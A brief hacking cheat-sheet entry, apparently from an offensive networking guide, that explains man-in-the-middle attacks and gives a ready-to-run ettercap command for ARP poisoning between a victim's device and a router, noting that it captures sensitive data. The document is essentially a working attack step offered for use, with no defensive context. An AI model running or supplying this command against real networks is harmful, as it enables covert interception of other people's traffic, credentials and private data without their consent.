# Man-in-the-Middle Attack

A MITM attack involves intercepting and potentially altering communication between a device and the network.

## Commands

#### 1) Launch an ARP poisoning MITM attack

    ettercap -T -q -i wlan0mon -M arp:remote /VICTIM_IP/ /ROUTER_IP/

You intercept traffic between a victim’s device and the router, capturing sensitive data.
